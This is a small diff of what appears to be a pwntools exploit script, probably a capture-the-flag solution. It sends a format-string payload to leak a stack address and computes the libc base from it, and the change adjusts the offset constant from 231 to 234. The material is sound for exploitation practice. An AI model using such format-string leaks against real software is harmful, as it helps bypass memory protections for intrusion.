@@ -28,7 +28,7 @@ p.sendlineafter('[y/N]', 'n')
 p.sendlineafter('input:', '#%25$p#')
 
 p.recvuntil('#')
-libc_off = int(p.recvuntil('#', drop = True), 16) - strt_main_off - 231
+libc_off = int(p.recvuntil('#', drop = True), 16) - strt_main_off - 234
 
 log.info('Libc off: ' + hex(libc_off))
 
